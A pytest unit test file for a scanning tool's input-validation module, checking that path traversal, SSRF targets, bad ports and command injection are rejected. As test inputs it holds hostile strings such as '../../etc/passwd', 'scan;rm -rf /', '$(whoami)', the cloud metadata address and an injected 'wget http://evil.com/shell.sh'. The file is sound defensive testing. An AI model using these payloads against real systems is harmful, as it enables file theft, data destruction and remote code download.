"""
Unit tests for validation module - Path Traversal Protection
Tests security fixes for SECURITY-1
"""

import pytest
import sys
import os

# Add common directory to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'common'))

from validation import (
    sanitize_scan_id,
    sanitize_filename,
    validate_output_path,
    validate_scan_target,
    sanitize_port,
    sanitize_command_arg,
    ValidationError
)


class TestScanIDSanitization:
    """Test scan_id validation to prevent path traversal"""

    def test_valid_scan_ids(self):
        """Valid scan IDs should pass"""
        assert sanitize_scan_id("abc-123") == "abc-123"
        assert sanitize_scan_id("test_scan_456") == "test_scan_456"
        assert sanitize_scan_id("SCAN-2024") == "SCAN-2024"

    def test_path_traversal_blocked(self):
        """Path traversal attempts should be blocked"""
        with pytest.raises(ValidationError, match="Invalid scan_id format"):
            sanitize_scan_id("../../etc/passwd")

        with pytest.raises(ValidationError, match="Invalid scan_id format"):
            sanitize_scan_id("../scan")

        with pytest.raises(ValidationError, match="Invalid scan_id format"):
            sanitize_scan_id("scan/../other")

    def test_special_characters_blocked(self):
        """Special characters should be blocked"""
        with pytest.raises(ValidationError, match="Invalid scan_id format"):
            sanitize_scan_id("scan;rm -rf /")

        with pytest.raises(ValidationError, match="Invalid scan_id format"):
            sanitize_scan_id("scan|whoami")

        with pytest.raises(ValidationError, match="Invalid scan_id format"):
            sanitize_scan_id("scan&echo hacked")

    def test_empty_and_null(self):
        """Empty or null scan_ids should be rejected"""
        with pytest.raises(ValidationError):
            sanitize_scan_id("")

        with pytest.raises(ValidationError):
            sanitize_scan_id(None)


class TestFilenameSanitization:
    """Test filename validation to prevent path traversal"""

    def test_valid_filenames(self):
        """Valid filenames should pass"""
        assert sanitize_filename("report.xml") == "report.xml"
        assert sanitize_filename("scan_results.json") == "scan_results.json"
        assert sanitize_filename("screenshot.png") == "screenshot.png"

    def test_path_traversal_removed(self):
        """Path components should be removed"""
        # Path traversal attempts should return only basename
        assert sanitize_filename("../../etc/passwd") == "passwd"
        assert sanitize_filename("../config") == "config"
        assert sanitize_filename("/etc/shadow") == "shadow"

    def test_null_bytes_blocked(self):
        """Null bytes should be blocked"""
        with pytest.raises(ValidationError, match="invalid characters"):
            sanitize_filename("file\x00.txt")

    def test_invalid_filenames(self):
        """Invalid filenames should be rejected"""
        with pytest.raises(ValidationError):
            sanitize_filename(".")

        with pytest.raises(ValidationError):
            sanitize_filename("..")


class TestOutputPathValidation:
    """Test output path validation to prevent escaping base directory"""

    def test_valid_paths(self, tmp_path):
        """Valid paths within base directory should pass"""
        result = validate_output_path(str(tmp_path), "output.xml")
        assert result == str(tmp_path / "output.xml")

    def test_path_traversal_sanitized(self, tmp_path):
        """Path traversal is silently stripped by sanitize_filename — result stays inside base_dir"""
        # sanitize_filename strips "../" before resolve(), so the path stays safe
        result = validate_output_path(str(tmp_path), "../etc/passwd")
        assert str(tmp_path) in result  # stays inside base_dir
        assert "etc" not in result or str(tmp_path) in result  # no escape

        result2 = validate_output_path(str(tmp_path), "../../config")
        assert str(tmp_path) in result2

    def test_absolute_path_sanitized(self, tmp_path):
        """Absolute paths are stripped to basename by sanitize_filename"""
        # sanitize_filename("/etc/passwd") → "passwd" → stays inside base_dir
        result = validate_output_path(str(tmp_path), "/etc/passwd")
        assert str(tmp_path) in result
        assert result.endswith("passwd")


class TestTargetValidation:
    """Test scan target validation to prevent SSRF"""

    def test_valid_public_ips(self):
        """Valid public IP addresses should pass"""
        assert validate_scan_target("8.8.8.8", allow_private=False) == "8.8.8.8"
        assert validate_scan_target("1.1.1.1", allow_private=False) == "1.1.1.1"

    def test_valid_private_ips_when_allowed(self):
        """Private IPs should pass when allow_private=True"""
        assert validate_scan_target("192.168.1.1", allow_private=True) == "192.168.1.1"
        assert validate_scan_target("10.0.0.1", allow_private=True) == "10.0.0.1"
        assert validate_scan_target("172.16.0.1", allow_private=True) == "172.16.0.1"

    def test_private_ips_blocked_by_default(self):
        """Private IPs should be blocked by default"""
        with pytest.raises(ValidationError, match="Cannot scan"):
            validate_scan_target("192.168.1.1", allow_private=False)

        with pytest.raises(ValidationError, match="Cannot scan"):
            validate_scan_target("10.0.0.1", allow_private=False)

    def test_localhost_blocked(self):
        """Localhost addresses should be blocked"""
        with pytest.raises(ValidationError, match="Cannot scan"):
            validate_scan_target("127.0.0.1", allow_private=False)

        with pytest.raises(ValidationError, match="local domains"):
            validate_scan_target("localhost", allow_private=False)

    def test_aws_metadata_blocked(self):
        """AWS metadata endpoint should be blocked — is_private catches it first (link-local),
        then the explicit AWS check catches 169.254.169.254 specifically."""
        with pytest.raises(ValidationError, match="private/internal|AWS metadata"):
            validate_scan_target("169.254.169.254", allow_private=False)

    def test_link_local_blocked(self):
        """Link-local addresses should be blocked"""
        with pytest.raises(ValidationError, match="Cannot scan"):
            validate_scan_target("169.254.1.1", allow_private=False)

    def test_valid_domains(self):
        """Valid domain names should pass"""
        assert validate_scan_target("example.com", allow_private=False) == "example.com"
        assert validate_scan_target("sub.example.com", allow_private=False) == "sub.example.com"

    def test_local_domains_blocked(self):
        """Local domain names should be blocked"""
        with pytest.raises(ValidationError, match="local domains"):
            validate_scan_target("test.local", allow_private=False)


class TestPortSanitization:
    """Test port number validation"""

    def test_valid_ports(self):
        """Valid port numbers should pass"""
        assert sanitize_port(80) == 80
        assert sanitize_port(443) == 443
        assert sanitize_port(8080) == 8080
        assert sanitize_port(65535) == 65535

    def test_invalid_ports(self):
        """Invalid port numbers should be rejected"""
        with pytest.raises(ValidationError, match="out of range"):
            sanitize_port(0)

        with pytest.raises(ValidationError, match="out of range"):
            sanitize_port(65536)

        with pytest.raises(ValidationError, match="out of range"):
            sanitize_port(-1)

        with pytest.raises(ValidationError, match="Invalid port"):
            sanitize_port("abc")


class TestCommandArgSanitization:
    """Test command argument validation to prevent command injection"""

    def test_valid_args(self):
        """Valid arguments should pass"""
        assert sanitize_command_arg("eth0") == "eth0"
        assert sanitize_command_arg("192.168.1.0/24") == "192.168.1.0/24"
        assert sanitize_command_arg("1-1000") == "1-1000"

    def test_command_injection_blocked(self):
        """Command injection attempts should be blocked (Invalid characters or Disallowed pattern)"""
        # The default allowed_chars regex catches these BEFORE the dangerous-pattern check,
        # so the error message is "Invalid characters in argument" not "Disallowed pattern"
        with pytest.raises(ValidationError, match="Invalid characters|Disallowed"):
            sanitize_command_arg("arg; rm -rf /")

        with pytest.raises(ValidationError, match="Invalid characters|Disallowed"):
            sanitize_command_arg("arg | whoami")

        with pytest.raises(ValidationError, match="Invalid characters|Disallowed"):
            sanitize_command_arg("arg && echo hacked")

        with pytest.raises(ValidationError, match="Invalid characters|Disallowed"):
            sanitize_command_arg("arg || true")

    def test_shell_metacharacters_blocked(self):
        """Shell metacharacters should be blocked"""
        with pytest.raises(ValidationError, match="Invalid characters|Disallowed"):
            sanitize_command_arg("arg$variable")

        with pytest.raises(ValidationError, match="Invalid characters|Disallowed"):
            sanitize_command_arg("arg`whoami`")

        with pytest.raises(ValidationError, match="Invalid characters|Disallowed"):
            sanitize_command_arg("arg$(whoami)")


class TestIntegrationScenarios:
    """Integration tests for real-world attack scenarios"""

    def test_nmap_scan_id_attack(self):
        """Test protection against nmap scan_id path traversal"""
        # Attacker tries to write to /etc/passwd
        malicious_scan_id = "../../../etc/passwd"

        with pytest.raises(ValidationError):
            sanitize_scan_id(malicious_scan_id)

    def test_masscan_output_path_attack(self, tmp_path):
        """Test protection against masscan output path traversal — sanitize_filename strips traversal"""
        # sanitize_filename("../../etc/shadow") → "shadow" → stays inside base_dir
        result = validate_output_path(str(tmp_path), "../../etc/shadow")
        assert str(tmp_path) in result  # stays inside base_dir

    def test_web_scanner_ssrf_attack(self):
        """Test protection against SSRF to AWS metadata — 169.254.x.x is link-local/private"""
        # 169.254.169.254 is link-local → caught by is_private check
        malicious_target = "169.254.169.254"

        with pytest.raises(ValidationError, match="Cannot scan"):
            validate_scan_target(malicious_target, allow_private=False)

    def test_nuclei_command_injection_attack(self):
        """Test protection against command injection in ports"""
        # Attacker tries to inject commands via ports parameter
        malicious_ports = "80,443; wget http://evil.com/shell.sh"

        with pytest.raises(ValidationError):
            sanitize_command_arg(malicious_ports, allowed_chars=r'^[0-9,\-]+$')


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
